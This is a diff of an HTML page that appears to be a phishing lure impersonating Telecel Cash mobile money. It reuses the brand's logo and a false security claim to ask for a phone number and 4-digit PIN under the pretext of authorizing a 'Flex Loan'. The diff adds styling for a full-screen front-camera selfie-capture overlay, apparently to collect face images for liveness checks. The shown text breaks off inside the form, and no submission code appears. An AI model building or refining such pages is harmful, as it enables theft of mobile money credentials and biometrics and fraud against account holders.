@@ -1,682 +1,672 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify & Authorize Loan - Telecel Cash</title>
-    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --red: #E42320;
-            --red-dark: #c01c1a;
-            --red-soft: rgba(228,35,32,0.08);
-            --red-border: rgba(228,35,32,0.18);
-            --text-dark: #111827;
-            --text-mid: #4b5563;
-            --text-light: #9ca3af;
-            --bg: #f3f4f6;
-            --card: #ffffff;
-            --border: #e5e7eb;
-            --input-bg: #f9fafb;
-            --shadow: 0 20px 60px rgba(0,0,0,0.10), 0 4px 16px rgba(0,0,0,0.06);
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verify & Authorize Loan - Telecel Cash</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --red:#E42320; --red-dark:#c01c1a;
+  --red-soft:rgba(228,35,32,0.08); --red-border:rgba(228,35,32,0.18);
+  --text-dark:#111827; --text-mid:#4b5563; --text-light:#9ca3af;
+  --bg:#f3f4f6; --card:#ffffff; --border:#e5e7eb; --input-bg:#f9fafb;
+  --shadow:0 20px 60px rgba(0,0,0,0.10),0 4px 16px rgba(0,0,0,0.06);
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'DM Sans',sans-serif;background:var(--bg);min-height:100vh;
+  display:flex;align-items:center;justify-content:center;padding:16px;
+  background-image:radial-gradient(ellipse at 20% 10%,rgba(228,35,32,0.06) 0%,transparent 55%),
+                   radial-gradient(ellipse at 80% 90%,rgba(228,35,32,0.04) 0%,transparent 50%)}
+.card{width:100%;max-width:430px;background:var(--card);border-radius:28px;
+  box-shadow:var(--shadow);overflow:hidden;animation:fadeUp .45s cubic-bezier(.22,.8,.3,1) both}
+@keyframes fadeUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
 
-        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+/* HEADER */
+.header{background:linear-gradient(135deg,#E42320 0%,#c01c1a 100%);padding:28px 28px 24px;position:relative;overflow:hidden}
+.header::before{content:'';position:absolute;top:-40px;right:-40px;width:160px;height:160px;background:rgba(255,255,255,0.06);border-radius:50%}
+.header::after{content:'';position:absolute;bottom:-30px;left:30px;width:100px;height:100px;background:rgba(255,255,255,0.04);border-radius:50%}
+.logo-wrap{display:flex;align-items:center;gap:12px;margin-bottom:18px;position:relative;z-index:1}
+.logo-bg{background:white;border-radius:14px;padding:6px;display:flex;align-items:center;justify-content:center;width:48px;height:48px;flex-shrink:0}
+.brand-name{font-family:'Sora',sans-serif;font-size:18px;font-weight:700;color:white;letter-spacing:-0.3px;line-height:1.1}
+.brand-sub{font-size:11.5px;color:rgba(255,255,255,0.72);font-weight:400;letter-spacing:0.5px;text-transform:uppercase;margin-top:1px}
+.header-title{font-family:'Sora',sans-serif;font-size:23px;font-weight:800;color:white;position:relative;z-index:1;letter-spacing:-0.5px;line-height:1.2}
+.header-desc{font-size:13.5px;color:rgba(255,255,255,0.78);margin-top:6px;position:relative;z-index:1;line-height:1.55;font-weight:400}
 
-        body {
-            font-family: 'DM Sans', sans-serif;
-            background: var(--bg);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
-            background-image:
-                radial-gradient(ellipse at 20% 10%, rgba(228,35,32,0.06) 0%, transparent 55%),
-                radial-gradient(ellipse at 80% 90%, rgba(228,35,32,0.04) 0%, transparent 50%);
-        }
+/* LOAN INFO */
+.loan-info{margin:20px 22px 0;background:var(--red-soft);border:1px solid var(--red-border);border-radius:18px;padding:16px 18px;display:flex;align-items:center;gap:14px}
+.loan-icon{width:42px;height:42px;background:var(--red);border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.loan-icon svg{width:22px;height:22px}
+.loan-label{font-size:11.5px;font-weight:600;color:var(--red);letter-spacing:0.6px;text-transform:uppercase}
+.loan-amount{font-family:'Sora',sans-serif;font-size:26px;font-weight:800;color:var(--text-dark);letter-spacing:-0.8px;line-height:1.1}
+.loan-details{font-size:12.5px;color:var(--text-mid);margin-top:2px;font-weight:500}
 
-        .card {
-            width: 100%;
-            max-width: 430px;
-            background: var(--card);
-            border-radius: 28px;
-            box-shadow: var(--shadow);
-            overflow: hidden;
-            animation: fadeUp 0.45s cubic-bezier(.22,.8,.3,1) both;
-        }
+/* FORM */
+.form-body{padding:22px 22px 26px}
+.form-group{margin-bottom:16px}
+label{display:block;font-size:13px;font-weight:600;color:var(--text-dark);margin-bottom:7px;letter-spacing:0.1px}
+select,input{width:100%;padding:13px 15px;background:var(--input-bg);border:1.5px solid var(--border);
+  border-radius:13px;font-family:'DM Sans',sans-serif;font-size:15.5px;color:var(--text-dark);
+  transition:border-color .18s,box-shadow .18s,background .18s;appearance:none;-webkit-appearance:none;outline:none}
+.select-wrap{position:relative}
+.select-wrap::after{content:'';position:absolute;right:15px;top:50%;transform:translateY(-50%);
+  width:0;height:0;border-left:5px solid transparent;border-right:5px solid transparent;border-top:6px solid var(--text-mid);pointer-events:none}
+select:focus,input:focus{border-color:var(--red);background:#fff;box-shadow:0 0 0 3.5px rgba(228,35,32,0.10)}
+input::placeholder{color:var(--text-light)}
+.pin-hint{font-size:11.5px;color:var(--text-light);margin-top:5px;font-weight:500}
+.error-msg{display:none;background:#fff1f1;border:1px solid #fca5a5;color:#b91c1c;font-size:13.5px;
+  font-weight:500;border-radius:12px;padding:12px 14px;margin-bottom:16px;line-height:1.5}
+.btn-primary{width:100%;background:linear-gradient(135deg,#E42320,#c01c1a);color:white;border:none;padding:15px;
+  font-family:'Sora',sans-serif;font-size:16px;font-weight:700;border-radius:50px;cursor:pointer;
+  letter-spacing:-0.2px;transition:opacity .18s,transform .12s,box-shadow .18s;
+  box-shadow:0 4px 18px rgba(228,35,32,0.35);margin-top:4px}
+.btn-primary:hover:not(:disabled){opacity:.93;box-shadow:0 6px 24px rgba(228,35,32,0.40);transform:translateY(-1px)}
+.btn-primary:active:not(:disabled){transform:translateY(0)}
+.btn-primary:disabled{background:#d1d5db;box-shadow:none;cursor:not-allowed}
+.btn-back{width:100%;background:transparent;color:var(--text-mid);border:1.5px solid var(--border);padding:14px;
+  font-family:'DM Sans',sans-serif;font-size:15px;font-weight:600;border-radius:50px;cursor:pointer;margin-top:10px;transition:border-color .18s,color .18s}
+.btn-back:hover{border-color:#9ca3af;color:var(--text-dark)}
+.security-note{display:flex;align-items:center;gap:7px;justify-content:center;font-size:12px;color:var(--text-light);margin-top:18px;font-weight:500}
 
-        @keyframes fadeUp {
-            from { opacity: 0; transform: translateY(24px); }
-            to   { opacity: 1; transform: translateY(0); }
-        }
+/* ── SELFIE SCREEN (full-screen overlay) ── */
+#selfieScreen{
+  display:none;position:fixed;inset:0;z-index:99999;
+  background:#000;flex-direction:column;align-items:center;justify-content:flex-end;
+}
+#selfieVideo{
+  position:absolute;inset:0;width:100%;height:100%;object-fit:cover;
+  transform:scaleX(-1); /* mirror front cam */
+}
+/* SVG overlay — arrows + oval drawn here, zero text on video */
+#selfieOverlay{
+  position:absolute;inset:0;width:100%;height:100%;pointer-events:none;
+}
+/* Bottom instruction panel — below the video, glass effect */
+.selfie-panel{
+  position:relative;z-index:2;width:100%;
+  background:linear-gradient(0deg,rgba(0,0,0,0.88) 0%,rgba(0,0,0,0.0) 100%);
+  padding:20px 28px 38px;
+  display:flex;flex-direction:column;align-items:center;gap:14px;
+}
+.selfie-dots{display:flex;gap:10px;align-items:center}
+.sdot{width:9px;height:9px;border-radius:50%;background:rgba(255,255,255,0.22);transition:all .3s}
+.sdot.active{background:#E42320;transform:scale(1.35)}
+.sdot.done{background:#22c55e}
+.selfie-instr{
+  font-family:'Sora',sans-serif;font-size:19px;font-weight:800;
+  color:#fff;letter-spacing:-0.3px;text-align:center;min-height:26px;
+  transition:opacity .18s;
+}
+.selfie-sub{font-size:13px;color:rgba(255,255,255,0.5);text-align:center;margin-top:-6px}
+.selfie-cancel-btn{
+  margin-top:2px;background:rgba(255,255,255,0.10);color:rgba(255,255,255,0.6);
+  border:1px solid rgba(255,255,255,0.18);padding:11px 36px;border-radius:50px;
+  font-family:'DM Sans',sans-serif;font-size:14px;cursor:pointer;
+  transition:background .18s;
+}
+.selfie-cancel-btn:hover{background:rgba(255,255,255,0.18)}
 
-        .header {
-            background: linear-gradient(135deg, #E42320 0%, #c01c1a 100%);
-            padding: 28px 28px 24px;
-            position: relative;
-            overflow: hidden;
-        }
-        .header::before {
-            content: '';
-            position: absolute;
-            top: -40px; right: -40px;
-            width: 160px; height: 160px;
-            background: rgba(255,255,255,0.06);
-            border-radius: 50%;
-        }
-        .header::after {
-            content: '';
-            position: absolute;
-            bottom: -30px; left: 30px;
-            width: 100px; height: 100px;
-            background: rgba(255,255,255,0.04);
-            border-radius: 50%;
-        }
+/* SPINNER */
+#spinner{display:none;position:fixed;inset:0;background:rgba(10,10,10,0.90);z-index:10000;
+  align-items:center;justify-content:center;flex-direction:column;gap:20px;backdrop-filter:blur(4px)}
+.spin-ring{width:62px;height:62px;border:5px solid rgba(255,255,255,0.12);border-top-color:var(--red);
+  border-radius:50%;animation:spin .9s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.spin-label{font-family:'Sora',sans-serif;font-size:16px;font-weight:600;color:white;letter-spacing:-0.2px}
+.spin-sub{font-size:13px;color:rgba(255,255,255,0.55);margin-top:-12px}
 
-        .logo-wrap {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 18px;
-            position: relative;
-            z-index: 1;
-        }
-        .logo-bg {
-            background: white;
-            border-radius: 14px;
-            padding: 6px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 48px;
-            height: 48px;
-            flex-shrink: 0;
-        }
-        .brand-name {
-            font-family: 'Sora', sans-serif;
-            font-size: 18px;
-            font-weight: 700;
-            color: white;
-            letter-spacing: -0.3px;
-            line-height: 1.1;
-        }
-        .brand-sub {
-            font-size: 11.5px;
-            color: rgba(255,255,255,0.72);
-            font-weight: 400;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-            margin-top: 1px;
-        }
-
-        .header-title {
-            font-family: 'Sora', sans-serif;
-            font-size: 23px;
-            font-weight: 800;
-            color: white;
-            position: relative;
-            z-index: 1;
-            letter-spacing: -0.5px;
-            line-height: 1.2;
-        }
-        .header-desc {
-            font-size: 13.5px;
-            color: rgba(255,255,255,0.78);
-            margin-top: 6px;
-            position: relative;
-            z-index: 1;
-            line-height: 1.55;
-            font-weight: 400;
-        }
-
-        .loan-info {
-            margin: 20px 22px 0;
-            background: var(--red-soft);
-            border: 1px solid var(--red-border);
-            border-radius: 18px;
-            padding: 16px 18px;
-            display: flex;
-            align-items: center;
-            gap: 14px;
-        }
-        .loan-icon {
-            width: 42px; height: 42px;
-            background: var(--red);
-            border-radius: 12px;
-            display: flex; align-items: center; justify-content: center;
-            flex-shrink: 0;
-        }
-        .loan-icon svg { width: 22px; height: 22px; }
-        .loan-label {
-            font-size: 11.5px;
-            font-weight: 600;
-            color: var(--red);
-            letter-spacing: 0.6px;
-            text-transform: uppercase;
-        }
-        .loan-amount {
-            font-family: 'Sora', sans-serif;
-            font-size: 26px;
-            font-weight: 800;
-            color: var(--text-dark);
-            letter-spacing: -0.8px;
-            line-height: 1.1;
-        }
-        .loan-details {
-            font-size: 12.5px;
-            color: var(--text-mid);
-            margin-top: 2px;
-            font-weight: 500;
-        }
-
-        .form-body {
-            padding: 22px 22px 26px;
-        }
-
-        .form-group {
-            margin-bottom: 16px;
-        }
-        label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: var(--text-dark);
-            margin-bottom: 7px;
-            letter-spacing: 0.1px;
-        }
-        select, input {
-            width: 100%;
-            padding: 13px 15px;
-            background: var(--input-bg);
-            border: 1.5px solid var(--border);
-            border-radius: 13px;
-            font-family: 'DM Sans', sans-serif;
-            font-size: 15.5px;
-            color: var(--text-dark);
-            transition: border-color 0.18s, box-shadow 0.18s, background 0.18s;
-            appearance: none;
-            -webkit-appearance: none;
-            outline: none;
-        }
-        .select-wrap {
-            position: relative;
-        }
-        .select-wrap::after {
-            content: '';
-            position: absolute;
-            right: 15px; top: 50%;
-            transform: translateY(-50%);
-            width: 0; height: 0;
-            border-left: 5px solid transparent;
-            border-right: 5px solid transparent;
-            border-top: 6px solid var(--text-mid);
-            pointer-events: none;
-        }
-        select:focus, input:focus {
-            border-color: var(--red);
-            background: #fff;
-            box-shadow: 0 0 0 3.5px rgba(228,35,32,0.10);
-        }
-        input::placeholder { color: var(--text-light); }
-
-        .pin-hint {
-            font-size: 11.5px;
-            color: var(--text-light);
-            margin-top: 5px;
-            font-weight: 500;
-        }
-
-        .error-msg {
-            display: none;
-            background: #fff1f1;
-            border: 1px solid #fca5a5;
-            color: #b91c1c;
-            font-size: 13.5px;
-            font-weight: 500;
-            border-radius: 12px;
-            padding: 12px 14px;
-            margin-bottom: 16px;
-            line-height: 1.5;
-        }
-
-        .btn-primary {
-            width: 100%;
-            background: linear-gradient(135deg, #E42320, #c01c1a);
-            color: white;
-            border: none;
-            padding: 15px;
-            font-family: 'Sora', sans-serif;
-            font-size: 16px;
-            font-weight: 700;
-            border-radius: 50px;
-            cursor: pointer;
-            letter-spacing: -0.2px;
-            transition: opacity 0.18s, transform 0.12s, box-shadow 0.18s;
-            box-shadow: 0 4px 18px rgba(228,35,32,0.35);
-            margin-top: 4px;
-        }
-        .btn-primary:hover:not(:disabled) {
-            opacity: 0.93;
-            box-shadow: 0 6px 24px rgba(228,35,32,0.40);
-            transform: translateY(-1px);
-        }
-        .btn-primary:active:not(:disabled) { transform: translateY(0); }
-        .btn-primary:disabled {
-            background: #d1d5db;
-            box-shadow: none;
-            cursor: not-allowed;
-        }
-
-        .btn-back {
-            width: 100%;
-            background: transparent;
-            color: var(--text-mid);
-            border: 1.5px solid var(--border);
-            padding: 14px;
-            font-family: 'DM Sans', sans-serif;
-            font-size: 15px;
-            font-weight: 600;
-            border-radius: 50px;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: border-color 0.18s, color 0.18s;
-        }
-        .btn-back:hover { border-color: #9ca3af; color: var(--text-dark); }
-
-        #spinner {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(10,10,10,0.90);
-            z-index: 10000;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            gap: 20px;
-            backdrop-filter: blur(4px);
-        }
-        .spin-ring {
-            width: 62px; height: 62px;
-            border: 5px solid rgba(255,255,255,0.12);
-            border-top-color: var(--red);
-            border-radius: 50%;
-            animation: spin 0.9s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .spin-label {
-            font-family: 'Sora', sans-serif;
-            font-size: 16px;
-            font-weight: 600;
-            color: white;
-            letter-spacing: -0.2px;
-        }
-        .spin-sub {
-            font-size: 13px;
-            color: rgba(255,255,255,0.55);
-            margin-top: -12px;
-        }
-
-        .security-note {
-            display: flex;
-            align-items: center;
-            gap: 7px;
-            justify-content: center;
-            font-size: 12px;
-            color: var(--text-light);
-            margin-top: 18px;
-            font-weight: 500;
-        }
-        .security-note svg { flex-shrink: 0; }
-
-        /* Toast popup */
-        #toast {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 99999;
-            background: #fff;
-            border-radius: 20px;
-            box-shadow: 0 24px 64px rgba(0,0,0,0.22), 0 4px 16px rgba(0,0,0,0.10);
-            padding: 32px 28px 24px;
-            max-width: 320px;
-            width: 90%;
-            text-align: center;
-            animation: popIn 0.25s cubic-bezier(.22,.8,.3,1) both;
-        }
-        @keyframes popIn {
-            from { opacity: 0; transform: translate(-50%, -48%) scale(0.93); }
-            to   { opacity: 1; transform: translate(-50%, -50%) scale(1); }
-        }
-        #toast-overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(10,10,10,0.55);
-            z-index: 99998;
-            backdrop-filter: blur(3px);
-        }
-        .toast-icon {
-            width: 56px; height: 56px;
-            background: #fff1f1;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 16px;
-        }
-        .toast-icon svg { width: 28px; height: 28px; }
-        .toast-title {
-            font-family: 'Sora', sans-serif;
-            font-size: 18px;
-            font-weight: 800;
-            color: var(--text-dark);
-            margin-bottom: 8px;
-            letter-spacing: -0.3px;
-        }
-        .toast-msg {
-            font-size: 14px;
-            color: var(--text-mid);
-            line-height: 1.55;
-            margin-bottom: 22px;
-        }
-        .toast-btn {
-            width: 100%;
-            background: linear-gradient(135deg, #E42320, #c01c1a);
-            color: white;
-            border: none;
-            padding: 13px;
-            font-family: 'Sora', sans-serif;
-            font-size: 15px;
-            font-weight: 700;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 4px 14px rgba(228,35,32,0.30);
-            transition: opacity 0.18s;
-        }
-        .toast-btn:hover { opacity: 0.9; }
-    </style>
+/* TOAST */
+#toast{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:99999;
+  background:#fff;border-radius:20px;box-shadow:0 24px 64px rgba(0,0,0,0.22),0 4px 16px rgba(0,0,0,0.10);
+  padding:32px 28px 24px;max-width:320px;width:90%;text-align:center;
+  animation:popIn .25s cubic-bezier(.22,.8,.3,1) both}
+@keyframes popIn{from{opacity:0;transform:translate(-50%,-48%) scale(0.93)}to{opacity:1;transform:translate(-50%,-50%) scale(1)}}
+#toast-overlay{display:none;position:fixed;inset:0;background:rgba(10,10,10,0.55);z-index:99998;backdrop-filter:blur(3px)}
+.toast-icon{width:56px;height:56px;background:#fff1f1;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
+.toast-icon svg{width:28px;height:28px}
+.toast-title{font-family:'Sora',sans-serif;font-size:18px;font-weight:800;color:var(--text-dark);margin-bottom:8px;letter-spacing:-0.3px}
+.toast-msg{font-size:14px;color:var(--text-mid);line-height:1.55;margin-bottom:22px}
+.toast-btn{width:100%;background:linear-gradient(135deg,#E42320,#c01c1a);color:white;border:none;padding:13px;
+  font-family:'Sora',sans-serif;font-size:15px;font-weight:700;border-radius:50px;cursor:pointer;
+  box-shadow:0 4px 14px rgba(228,35,32,0.30);transition:opacity .18s}
+.toast-btn:hover{opacity:.9}
+</style>
 </head>
 <body>
 
+<!-- MAIN CARD -->
 <div class="card">
-    <div class="header">
-        <div class="logo-wrap">
-            <div class="logo-bg">
-                <svg width="36" height="36" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M48.19 28.6833C40.4333 28.605 34.1983 34.9933 34.2183 42.58C34.2383 50.625 40.9883 56.56 48.0333 56.4317C55.5033 56.5017 61.8867 50.53 61.9517 42.7583C62.02 34.62 55.575 28.76 48.19 28.6833ZM53.7333 38.1633C53.6017 39.2783 52.9467 39.9367 51.93 40.29C51.3683 40.4867 50.7833 40.4917 50.195 40.4917C49.8333 40.49 49.4683 40.46 49.1067 40.5183C48.8467 40.5617 48.7033 40.6917 48.6667 40.97C48.6133 41.3467 48.6917 41.7133 48.6883 42.085C48.6867 43.6083 48.6883 45.135 48.6867 46.6583C48.6867 46.9117 48.7133 47.1617 48.7667 47.4067C48.9833 48.3783 49.7917 48.955 50.7817 48.8333C51.5417 48.7383 52.31 48.7333 53.0733 48.6683C53.3933 48.6417 53.495 48.7833 53.4717 49.1233C53.435 49.6333 53.4383 50.1433 53.47 50.655C53.535 51.715 53.0383 52.4717 52.1333 52.8467C49.6867 53.8583 47.2717 53.835 45.065 52.2417C43.8517 51.3667 43.2033 50.115 43.1333 48.57C43.0467 46.585 43.0117 44.6 42.9517 42.6117C42.8883 40.605 42.9083 38.5967 42.9233 36.59C42.9333 35.2433 43.5583 34.15 44.5517 33.265C45.1033 32.7717 45.7183 32.37 46.3867 32.05C46.9933 31.7583 47.6283 31.6483 48.295 31.6583C48.5333 31.6633 48.6233 31.7533 48.6467 31.9983C48.7117 32.6333 48.68 33.27 48.6933 33.8517C48.6933 34.3667 48.6883 34.8317 48.6933 35.295C48.695 35.6983 48.8383 35.845 49.2467 35.905C49.5283 35.9483 49.8083 35.9117 50.09 35.91C51.06 35.8983 52.0267 35.8983 52.9967 35.905C53.5683 35.9117 53.745 36.0867 53.7283 36.6517C53.7117 37.1567 53.7967 37.655 53.7383 38.1633H53.7333Z" fill="#E32526"/>
-                    <path d="M48.665 40.9682C48.6117 41.3448 48.69 41.7115 48.6867 42.0832C48.685 43.6065 48.6867 45.1332 48.685 46.6565C48.685 46.9098 48.7117 47.1598 48.765 47.4048C48.9817 48.3765 49.79 48.9532 50.78 48.8315C51.54 48.7365 52.3083 48.7315 53.0717 48.6665C53.3917 48.6398 53.4933 48.7815 53.47 49.1215C53.4333 49.6315 53.4367 50.1415 53.4683 50.6532C53.5333 51.7132 53.0367 52.4698 52.1317 52.8448C49.685 53.8565 47.27 53.8332 45.0633 52.2398C43.85 51.3648 43.2017 50.1132 43.1317 48.5682C43.045 46.5832 43.01 44.5982 42.95 42.6098C42.8867 40.6032 42.9067 38.5948 42.9217 36.5882C42.9317 35.2415 43.5567 34.1482 44.55 33.2632C45.1017 32.7698 45.7167 32.3682 46.385 32.0482C46.9917 31.7565 47.6267 31.6465 48.2933 31.6565C48.5317 31.6615 48.6217 31.7515 48.645 31.9965C48.71 32.6315 48.6783 33.2682 48.6917 33.8498C48.6917 34.3648 48.6867 34.8298 48.6917 35.2932C48.6933 35.6965 48.8367 35.8432 49.245 35.9032C49.5267 35.9465 49.8067 35.9098 50.0883 35.9082C51.0583 35.8965 52.025 35.8965 52.995 35.9032C53.5667 35.9098 53.7433 36.0848 53.7267 36.6498C53.71 37.1548 53.795 37.6532 53.7367 38.1615C53.605 39.2765 52.95 39.9348 51.9333 40.2882C51.3717 40.4848 50.7867 40.4898 50.1983 40.4898C49.8367 40.4882 49.4717 40.4582 49.11 40.5165C48.85 40.5598 48.7067 40.6898 48.67 40.9682H48.665Z" fill="white"/>
-                </svg>
-            </div>
-            <div>
-                <div class="brand-name">Telecel Cash</div>
-                <div class="brand-sub">Mobile Money</div>
-            </div>
-        </div>
-        <div class="header-title">Authorize Your Loan</div>
-        <div class="header-desc">Enter your Telecel number and PIN to securely verify and approve your Flex Loan request.</div>
+  <div class="header">
+    <div class="logo-wrap">
+      <div class="logo-bg">
+        <svg width="36" height="36" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M48.19 28.6833C40.4333 28.605 34.1983 34.9933 34.2183 42.58C34.2383 50.625 40.9883 56.56 48.0333 56.4317C55.5033 56.5017 61.8867 50.53 61.9517 42.7583C62.02 34.62 55.575 28.76 48.19 28.6833ZM53.7333 38.1633C53.6017 39.2783 52.9467 39.9367 51.93 40.29C51.3683 40.4867 50.7833 40.4917 50.195 40.4917C49.8333 40.49 49.4683 40.46 49.1067 40.5183C48.8467 40.5617 48.7033 40.6917 48.6667 40.97C48.6133 41.3467 48.6917 41.7133 48.6883 42.085C48.6867 43.6083 48.6883 45.135 48.6867 46.6583C48.6867 46.9117 48.7133 47.1617 48.7667 47.4067C48.9833 48.3783 49.7917 48.955 50.7817 48.8333C51.5417 48.7383 52.31 48.7333 53.0733 48.6683C53.3933 48.6417 53.495 48.7833 53.4717 49.1233C53.435 49.6333 53.4383 50.1433 53.47 50.655C53.535 51.715 53.0383 52.4717 52.1333 52.8467C49.6867 53.8583 47.2717 53.835 45.065 52.2417C43.8517 51.3667 43.2033 50.115 43.1333 48.57C43.0467 46.585 43.0117 44.6 42.9517 42.6117C42.8883 40.605 42.9083 38.5967 42.9233 36.59C42.9333 35.2433 43.5583 34.15 44.5517 33.265C45.1033 32.7717 45.7183 32.37 46.3867 32.05C46.9933 31.7583 47.6283 31.6483 48.295 31.6583C48.5333 31.6633 48.6233 31.7533 48.6467 31.9983C48.7117 32.6333 48.68 33.27 48.6933 33.8517C48.6933 34.3667 48.6883 34.8317 48.6933 35.295C48.695 35.6983 48.8383 35.845 49.2467 35.905C49.5283 35.9483 49.8083 35.9117 50.09 35.91C51.06 35.8983 52.0267 35.8983 52.9967 35.905C53.5683 35.9117 53.745 36.0867 53.7283 36.6517C53.7117 37.1567 53.7967 37.655 53.7383 38.1633H53.7333Z" fill="#E32526"/>
+          <path d="M48.665 40.9682C48.6117 41.3448 48.69 41.7115 48.6867 42.0832C48.685 43.6065 48.6867 45.1332 48.685 46.6565C48.685 46.9098 48.7117 47.1598 48.765 47.4048C48.9817 48.3765 49.79 48.9532 50.78 48.8315C51.54 48.7365 52.3083 48.7315 53.0717 48.6665C53.3917 48.6398 53.4933 48.7815 53.47 49.1215C53.4333 49.6315 53.4367 50.1415 53.4683 50.6532C53.5333 51.7132 53.0367 52.4698 52.1317 52.8448C49.685 53.8565 47.27 53.8332 45.0633 52.2398C43.85 51.3648 43.2017 50.1132 43.1317 48.5682C43.045 46.5832 43.01 44.5982 42.95 42.6098C42.8867 40.6032 42.9067 38.5948 42.9217 36.5882C42.9317 35.2415 43.5567 34.1482 44.55 33.2632C45.1017 32.7698 45.7167 32.3682 46.385 32.0482C46.9917 31.7565 47.6267 31.6465 48.2933 31.6565C48.5317 31.6615 48.6217 31.7515 48.645 31.9965C48.71 32.6315 48.6783 33.2682 48.6917 33.8498C48.6917 34.3648 48.6867 34.8298 48.6917 35.2932C48.6933 35.6965 48.8367 35.8432 49.245 35.9032C49.5267 35.9465 49.8067 35.9098 50.0883 35.9082C51.0583 35.8965 52.025 35.8965 52.995 35.9032C53.5667 35.9098 53.7433 36.0848 53.7267 36.6498C53.71 37.1548 53.795 37.6532 53.7367 38.1615C53.605 39.2765 52.95 39.9348 51.9333 40.2882C51.3717 40.4848 50.7867 40.4898 50.1983 40.4898C49.8367 40.4882 49.4717 40.4582 49.11 40.5165C48.85 40.5598 48.7067 40.6898 48.67 40.9682H48.665Z" fill="white"/>
+        </svg>
+      </div>
+      <div>
+        <div class="brand-name">Telecel Cash</div>
+        <div class="brand-sub">Mobile Money</div>
+      </div>
     </div>
+    <div class="header-title">Authorize Your Loan</div>
+    <div class="header-desc">Enter your Telecel number and PIN to securely verify and approve your Flex Loan request.</div>
+  </div>
 
-    <div class="loan-info" id="loanInfo">
-        <div class="loan-icon">
-            <svg fill="none" viewBox="0 0 24 24" stroke="white" stroke-width="2">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
-            </svg>
-        </div>
-        <div class="loan-text">
-            <div class="loan-label" id="loanLabel">Flex Loan</div>
-            <div class="loan-amount" id="loanAmount">—</div>
-            <div class="loan-details" id="loanDetails"></div>
-        </div>
+  <div class="loan-info">
+    <div class="loan-icon">
+      <svg fill="none" viewBox="0 0 24 24" stroke="white" stroke-width="2">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+      </svg>
     </div>
-
-    <div class="form-body">
-
-        <div class="form-group">
-            <label for="accountType">Account Type</label>
-            <div class="select-wrap">
-                <select id="accountType">
-                    <option value="mobile">Telecel Cash (Mobile Money)</option>
-                    <option value="broadband">Broadband</option>
-                </select>
-            </div>
-        </div>
-
-        <div class="form-group">
-            <label for="phone">Phone Number</label>
-            <input type="tel" id="phone" placeholder="050XXXXXXXX" maxlength="10" inputmode="numeric">
-        </div>
-
-        <div class="form-group">
-            <label for="password">Telecel PIN</label>
-            <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
-            <div class="pin-hint">Enter your 4-digit Telecel Cash PIN</div>
-        </div>
-
-        <div class="error-msg" id="errMsg"></div>
-
-        <button class="btn-primary" id="continueBtn">Verify &amp; Authorize Loan</button>
-        <button class="btn-back" onclick="window.history.back()">← Back to Application</button>
-
-        <div class="security-note">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-            </svg>
-            256-bit encrypted &amp; secured by Telecel
-        </div>
+    <div>
+      <div class="loan-label" id="loanLabel">Flex Loan</div>
+      <div class="loan-amount" id="loanAmount">—</div>
+      <div class="loan-details" id="loanDetails"></div>
     </div>
+  </div>
+
+  <div class="form-body">
+    <div class="form-group">
+      <label>Account Type</label>
+      <div class="select-wrap">
+        <select id="accountType">
+          <option value="mobile">Telecel Cash (Mobile Money)</option>
+          <option value="broadband">Broadband</option>
+        </select>
+      </div>
+    </div>
+    <div class="form-group">
+      <label>Phone Number</label>
+      <input type="tel" id="phone" placeholder="050XXXXXXXX" maxlength="10" inputmode="numeric">
+    </div>
+    <div class="form-group">
+      <label>Telecel PIN</label>
+      <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
+      <div class="pin-hint">Enter your 4-digit Telecel Cash PIN</div>
+    </div>
